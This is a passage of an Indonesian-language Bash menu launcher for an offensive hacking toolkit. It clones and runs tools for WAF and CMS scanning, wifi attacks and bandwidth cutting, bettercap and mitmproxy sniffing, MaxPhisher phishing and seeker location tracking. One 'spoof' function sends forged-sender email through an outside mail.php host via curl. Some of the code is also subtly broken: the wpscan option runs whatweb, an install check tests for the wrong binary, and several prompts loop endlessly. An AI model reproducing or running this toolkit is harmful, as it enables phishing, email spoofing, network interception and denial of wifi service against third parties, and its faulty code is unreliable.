	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_wafw00f
	   	elif [[ $xyz = "0" ]];
	   	then
	   		wafwoof
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   
	    	
	    	

        elif [ $xyz = "2"  ];
        then
		if [[ -f /usr/bin/wafw00f ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwafw00f already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wafw00f \033[31;1mnot found\033[37;1m, installing wafw00f!\n"
                apt-get install wafw00f -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2
                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mchecking firewall\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_wafw00f
	   	elif [[ $xyz = "0" ]];
	   	then
	   		wafwoof
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        wafwoof
        fi
}

# cmseek
function cmseek(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall cmseek\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun cmseek\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/CMSeeK ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mcmseek already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m cmseek \033[31;1mnot found\033[37;1m, installing cmseek!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/Tuhinshubhra/CMSeeK > /dev/null 2>&1
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi

        cd $path/.data/CMSeeK;python3 cmseek.py
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	cd $path/.data/CMSeeK;python3 cmseek.py

	else [ $scan != "y" ]
	cmseek
	fi
	done

        cmseek
        sleep 2

        elif [ $xyz = "2"  ];
        then
                if [[ -d $path/.data/CMSeeK ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mcmseek already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m cmseek \033[31;1mnot found\033[37;1m, installing cmseek!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/Tuhinshubhra/CMSeeK > /dev/null 2>&1
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi

        cd $path/.data/CMSeeK;python3 cmseek.py
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	cd $path/.data/CMSeeK;python3 cmseek.py

	else [ $scan != "y" ]
	cmseek
	fi
	done
        cmseek
        sleep 2

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        cmseek
        fi
}

function exec_wpscan(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> http://example.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url  : "'\033[34;1m')" target
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	whatweb -v $target
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_wpscan

	else [ $scan != "y" ]
	wpscaning
	fi
	done
}

# wordpress scanning
function wpscaning(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall wpscan\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun wpscan\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/wpscan ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwpscan already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wpscan \033[31;1mnot found\033[37;1m, installing wpscan!\n"
                apt-get install wpscan -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mstarting scaning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_wpscan
	   	elif [[ $xyz = "0" ]];
	   	then
	   		wpscaning
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   
	    	
	    	

        elif [ $xyz = "2"  ];
        then
		if [[ -f /usr/bin/wpscan ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwpscan already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wpscan \033[31;1mnot found\033[37;1m, installing wpscan!\n"
                apt-get install wpscan -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mstarting scaning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_wpscan
	   	elif [[ $xyz = "0" ]];
	   	then
	   		wpscaning
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        wpscaning
        fi
}

function exec_whatweb(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> http://example.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url  : "'\033[34;1m')" target
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	whatweb -v $target
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_whatweb

	else [ $scan != "y" ]
	whatwebs
	fi
	done
}


# foot printing
function whatwebs(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall whatweb\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun whatweb\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/whatweb ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwhatweb already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m whatweb \033[31;1mnot found\033[37;1m, installing whatweb!\n"
                apt-get install whatweb -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mstarting scaning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_whatweb
	   	elif [[ $xyz = "0" ]];
	   	then
	   		whatwebs
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   
	    	
	    	

        elif [ $xyz = "2"  ];
        then
		if [[ -f /usr/bin/whatweb ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwhatweb already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m whatweb \033[31;1mnot found\033[37;1m, installing whatweb!\n"
                apt-get install whatweb -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mstarting scaning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_whatweb
	   	elif [[ $xyz = "0" ]];
	   	then
	   		whatwebs
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m please input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        whatwebs
        fi
}
# fungsi untuk menjalankan menu untuk web attack
function run_web_attack(){
        clear
        baner
        echo
        web_attack
                if [ $xyz = "1"  ];
                then
                sqli
                run_web_attack

                elif [ $xyz = "2"  ];
                then
                xss
                run_web_attack
                
                elif [ $xyz = "3"  ];
                then
                dirsec
                run_web_attack
                
                elif [ $xyz = "4"  ];
                then
                subdomain
                run_web_attack

                elif [ $xyz = "5"  ];
                then
                wafwoof
                run_web_attack
                  
                elif [ $xyz = "6"  ];
                then
                cmseek
                run_web_attack


                elif [ $xyz = "7"  ];
                then
                wpscaning
                run_web_attack

                elif [ $xyz = "8"  ];
                then
                whatwebs
                run_web_attack
                

                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_web_attack

                fi
}

# wifi attack
function airgeddon_menu(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall airgeddon - for hacking wifi\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun airgeddon\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [ -f /usr/bin/msfconsole ]; then
                printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m airgeddon is already exists!\n"
                else
                printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing airgeddon!\n"
                apt-get install airgeddon -y
                fi
                sleep 0.025


                sleep 3
                airgeddon_menu

        elif [ $xyz = "2"  ];
        then
        clear
        sleep 1s
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
        sleep 2
        clear
        airgeddon
        sleep 3
        airgeddon_menu

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        airgeddon_menu
        fi
}


# evillimiter for hacking bandwith wifi
function evillimiters(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall evillimiter - for kill wifi\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun evillimiter\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/evillimiter ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mevillimiter already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m evillimiter \033[31;1mnot found\033[37;1m, installing evillimiter!\n"
                cd $path/.data > /dev/null
		git clone https://github.com/bitbrute/evillimiter.git;chmod -R 777 evillimiter;cd evillimiter;sudo python3 setup.py install > /dev/null 2>&1
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

                sleep 3
                evillimiters

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/evillimiter ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mevillimiter already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m evillimiter \033[31;1mnot found\033[37;1m, installing evillimiter!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/bitbrute/evillimiter.git;chmod -R 777 evillimiter;cd evillimiter;sudo python3 setup.py install > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
       				printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				evillimiter
				sleep 3
       				evillimiters

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        evillimiters
        fi
}

# fungsi untuk menjalankan menu untuk wifi attack
function run_wifi_attack(){
        clear
        baner
        echo
        sadap
                if [ $xyz = "1"  ];
                then
                airgeddon_menu
                run_wifi_attack

		elif [ $xyz = "2"  ];
		then
		evillimiters
		run_wifi_attack

		elif [ $xyz = "0"  ];
		then
		runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_wifi_attack

                fi
}


# bettercap for sniffing
function better(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall bettercap - for sniffing\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun bettercap\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/bettercap ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
                sudo apt-get install bettercap -y
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo

                fi

                sleep 3
                better

        elif [ $xyz = "2"  ];
        then
                        if [[ -f /usr/bin/bettercap ]]; then
                        printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                        spiner
                        echo
                        sleep 2
                        clear
                        else
                        printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
                        sudo apt-get install bettercap -y
                        sleep 0.025
                        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                        printf '\033[31;1m'
                        spiner
                        echo

                        fi
                                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
                                sleep 2
                                clear
                                bettercap
                                sleep 3
                                better

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        better
        fi
}

# mitm attack for sniffing http/https
function proxy(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall manInThemidle proxy - for sniffing\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun manInThemidle\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/mitm ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/K1M4K-ID/mitm
                sudo apt-get install mitmproxy -y > /dev/null 2>&1
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'

                echo

                fi

                sleep 3
                proxy

        elif [ $xyz = "2"  ];
        then
                if [[ -d $path/.data/mitm ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/K1M4K-ID/mitm
                sudo apt-get install mitmproxy -y > /dev/null 2>&1
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'

                echo

                fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
        sleep 2
        clear
        cd $path/.data/mitm;bash mitm.sh
        sleep 3
        proxy

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        proxy
        fi
}



# fungsi untuk menjalankan menu untuk web attack
function run_mitm_attack(){
        clear
        baner
        echo
        mitm
                if [ $xyz = "1"  ];
                then
                better
                run_mitm_attack

                elif [ $xyz = "2"  ];
                then
                proxy
                run_mitm_attack

                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_mitm_attack

                fi
}

# function sosial engineering

function spoof(){
cat <<- EOF
${RED}
█▀▀ █▀▄▀█ ▄▀█ █ █░░   █▀ █▀█ █▀█ █▀█ █▀▀
${WHITE}██▄ █░▀░█ █▀█ █ █▄▄   ▄█ █▀▀ █▄█ █▄█ █▀░  
${WHITE}        
EOF
  #statements

echo
printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Author   : K1M4K-ID\n"
printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Version  : Beta V1\n" 
echo

  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From Name   : "'\033[32;1m\n')" name
  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From mail   : "'\033[32;1m\n')" mail
  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Send To     : "'\033[32;1m\n')" to   
  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Subject     : "'\033[32;1m\n')" sub 
  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Message     : "'\033[32;1m\n\n')" mes
  echo ""
  read -p "$(printf " * * * Enter To Send! * * *")" scan
  curl --data "name=$name&sender=$mail&email=$to&subject=$sub&message=$mes" https://kimak-id13s.000webhostapp.com/mail.php &> /dev/null
  printf "\n\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m successfully sendent!..\n"
  sleep 2s
  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m kirim ulang [y/n] : "'\033[34;1m')" scan
        echo
        while true
        do
                if [ $scan = "y"  ];
                then
                spoof

                else [ $scan != "n" ]
		run_soceng_attack
                fi
        done



}

function phishing(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall phishing attack ( all - phisher )\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun phishing\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/MaxPhisher ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mMaxPhisher already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m MaxPhisher \033[31;1mnot found\033[37;1m, installing MaxPhisher!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/KasRoudra/MaxPhisher
                sudo sudo apt install git python3 php openssh-client -y > /dev/null 2>&1
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'

                echo

                fi

                sleep 3
                phishing

        elif [ $xyz = "2"  ];
        then
                if [[ -d $path/.data/MaxPhisher ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mMaxPhisher already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m MaxPhisher \033[31;1mnot found\033[37;1m, installing MaxPhisher!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/KasRoudra/MaxPhisher
                sudo sudo apt install git python3 php openssh-client -y > /dev/null 2>&1
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'

                echo

                fi

        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
        sleep 2
        clear
        cd $path/.data/MaxPhisher;python3 maxphisher.py
        sleep 3
        phishing

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        phishing
        fi
}

function seeker(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall seeker ( social engineering tracking )\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun seeker\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/seeker ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mseeker already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m seeker \033[31;1mnot found\033[37;1m, installing seeker!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/thewhiteh4t/seeker;cd seeker;chmod +x install.sh;./install.sh
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'

                echo

                fi

                sleep 3
                seeker

        elif [ $xyz = "2"  ];
        then
                if [[ -d $path/.data/seeker ]]; then
